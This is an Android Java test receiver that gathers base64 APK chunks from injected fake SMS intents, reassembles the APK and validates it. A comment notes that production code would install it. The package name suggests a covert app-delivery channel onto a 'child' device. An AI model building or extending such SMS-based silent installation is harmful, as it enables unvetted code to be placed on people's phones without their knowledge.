package com.divine.specter.child.delivery;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Test receiver for ADB injection testing
 * Listens for custom test action instead of protected SMS_RECEIVED
 */
public class SmsApkTestReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsApkTestReceiver";
    private static final String TEST_ACTION = "com.divine.specter.child.TEST_SMS_CHUNK";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Debug: Log that receiver was triggered
        android.util.Log.wtf(TAG, "===== TEST RECEIVER ON RECEIVE CALLED =====");
        android.util.Log.wtf(TAG, "Action: " + (intent != null ? intent.getAction() : "NULL"));

        if (!TEST_ACTION.equals(intent.getAction())) {
            android.util.Log.wtf(TAG, "Action mismatch, returning");
            return;
        }

        String message = intent.getStringExtra("message");
        String sender = intent.getStringExtra("sender");

        android.util.Log.wtf(TAG, "Message extra: " + message);
        android.util.Log.wtf(TAG, "Sender extra: " + sender);

        if (sender == null) {
            sender = "+1234567890"; // Test sender
        }

        Log.i(TAG, "Received test SMS chunk from " + sender);
        Log.i(TAG, "Message: " + message);

        // Parse the chunk
        SmsChunker.ChunkInfo chunk = SmsChunker.parseChunk(message);

        if (chunk == null) {
            Log.e(TAG, "Failed to parse chunk: " + message);
            return;
        }

        Log.i(TAG, String.format("Parsed chunk: %d/%d (%d bytes base64)",
                chunk.chunkNumber, chunk.totalChunks, chunk.base64Data.length()));

        // Get or create chunk collection for this sender
        SmsChunker.ChunkCollection collection = SmsApkReceiver.getCollection(sender, chunk.totalChunks);

        // Decode and add chunk
        byte[] chunkData = SmsChunker.decodeChunk(chunk);
        if (chunkData == null) {
            Log.e(TAG, "Failed to decode chunk data");
            return;
        }

        boolean added = collection.addChunk(chunk.chunkNumber, chunkData);

        if (!added) {
            Log.w(TAG, "Duplicate chunk " + chunk.chunkNumber + ", ignoring");
            return;
        }

        // Check progress
        int received = chunk.totalChunks - collection.getMissingChunks().size();
        float progress = (received * 100.0f) / chunk.totalChunks;

        Log.i(TAG, String.format("Progress: %.1f%% (%d/%d chunks)",
                progress, received, chunk.totalChunks));

        // Check if complete
        if (collection.isComplete()) {
            Log.i(TAG, "All chunks received! Reassembling APK...");

            try {
                byte[] apkBytes = collection.reassemble();

                if (apkBytes == null) {
                    Log.e(TAG, "Failed to reassemble APK");
                    return;
                }

                Log.i(TAG, "APK reassembled: " + apkBytes.length + " bytes");

                // Validate APK structure
                if (!SmsChunker.isValidApk(apkBytes)) {
                    Log.e(TAG, "Invalid APK file structure");
                    return;
                }

                Log.i(TAG, "APK validation passed!");
                Log.i(TAG, "✅ TEST COMPLETE - APK successfully reassembled via SMS chunks");

                // In production, SmsApkReceiver.installApk() would be called here
                // For testing, we just log success

                // Clean up collection
                SmsApkReceiver.removeCollection(sender);

            } catch (java.io.IOException e) {
                Log.e(TAG, "Error reassembling APK: " + e.getMessage());
            }
        } else {
            java.util.List<Integer> missing = collection.getMissingChunks();
            Log.i(TAG, "Still waiting for " + missing.size() + " chunks");
        }
    }
}
